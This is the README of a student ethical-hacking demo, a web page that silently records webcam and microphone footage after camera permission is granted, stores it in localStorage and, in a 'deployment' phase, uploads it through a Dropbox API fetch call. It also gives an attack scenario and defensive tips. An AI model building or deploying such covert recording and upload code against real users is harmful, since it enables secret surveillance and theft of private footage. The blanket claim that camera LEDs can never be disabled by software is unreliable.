# 🔐 NullByte — Stealth Webcam Access Demo
### Ethical Hacking Assignment | Web Security Awareness Project

---

## 👥 Group Details

Zaid Haris, 
Fatima Sami 

---

## 📌 Objective

Demonstrate how unauthorized hardware access can occur through a browser by building a web application that silently records webcam footage once camera permission is granted without the user realizing it is happening. The goal is to build awareness around browser permission vulnerabilities and media stream exploitation.

---

## 🗂️ Project Structure

```
nullbyte-webcam-demo/
├── index.html       # Main landing page (UI + recording logic + warning modal)
|-- style.css
└── README.md        # This file
```

---

## ⚙️ How It Works

### Flow

```
User opens page
      ↓
Browser requests camera permission
      ↓
User clicks "Allow"
      ↓
MediaRecorder silently records for 12 seconds in background
      ↓
Camera indicator light turns off (stream stopped)
      ↓
Video saved to localStorage as base64 string and sent to cloud via dropbox API
      ↓
Glassmorphism warning modal appears explaining the vulnerability
```

### Key Technologies

| Technology | Purpose |
|---|---|
| `navigator.mediaDevices.getUserMedia()` | Requests camera and microphone access |
| `MediaRecorder API` | Records the live media stream in chunks |
| `FileReader API` | Converts video blob to base64 string |
| `localStorage` | Stores the recorded video (Phase 1) |
| HTML / CSS / Vanilla JS | Frontend — no frameworks used |

---

## 🚀 Running the Project

> **Important:** `getUserMedia` only works over HTTPS or `localhost`. Opening `index.html` directly as a file (`file://`) will not work in most browsers.

### VS Code Live Server (Recommended)
1. Install the **Live Server** extension in VS Code
2. Right-click `index.html` → **Open with Live Server**
3. Opens at `http://127.0.0.1:5500`
---

## 🎥 Recorded Video

After the demo runs, the recorded clip is saved in your browser's localStorage.

**To retrieve and play it back:**

1. Open **DevTools** → `F12`
2. Go to **Application** → **Local Storage** → `http://localhost:...`
3. Find the key: `recorded_clip`

Or paste this in the DevTools Console:
```javascript
const src = localStorage.getItem('recorded_clip');
const video = document.createElement('video');
video.src = src;
video.controls = true;
video.style.cssText = 'position:fixed;top:20px;right:20px;z-index:9999;width:320px;border:2px solid red';
document.body.appendChild(video);
```

**To clear the stored video:**
```javascript
localStorage.removeItem('recorded_clip');
```

---

## ☁️ Phase 2 — Cloud Storage (Deployment)

For deployment, replace the `localStorage.setItem(...)` line in the script with a cloud upload call.

### Dropbox Example
```javascript
const response = await fetch('https://content.dropboxapi.com/2/files/upload', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer YOUR_DROPBOX_ACCESS_TOKEN',
    'Dropbox-API-Arg': JSON.stringify({
      path: '/webcam-clip.webm',
      mode: 'overwrite'
    }),
    'Content-Type': 'application/octet-stream'
  },
  body: blob
});
```

---

## 🔓 Vulnerability Explained

### What is being demonstrated?

Once a user grants camera permission to a website (even for a seemingly legitimate reason), any script running on that same origin can re-access the camera silently — without prompting again. This is the **consent gap** in the browser permission model.

### Real-World Attack Scenario

1. Victim visits a malicious site disguised as a video call platform or ID verification form
2. Victim grants camera access, assuming it is required for the service
3. A background script silently records and exfiltrates the footage to a remote server
4. Victim has no indication anything happened

### Why the LED Cannot Be Disabled

The camera indicator LED is hardwired directly to the camera sensor at the circuit board level. It is entirely outside the reach of software, drivers, the OS, and the browser. This is an intentional hardware protection and cannot be bypassed via JavaScript.

---

## 🛡️ Defensive Recommendations

- Always check which sites have camera permission: `Browser Settings → Privacy → Camera`
- Revoke camera access from any site that does not genuinely require it
- Use a physical webcam cover when not in active use
- If a camera LED activates unexpectedly on a webpage close it immediately
- Prefer browsers that show persistent camera-in-use indicators in the toolbar

---

## ⚠️ Disclaimer

This project is developed strictly for **educational purposes** as part of an ethical hacking course assignment. All demonstrations are conducted in controlled environments with informed participants. The techniques shown must never be used on real users without explicit prior consent. Unauthorized use of these methods is illegal under computer misuse and privacy laws.
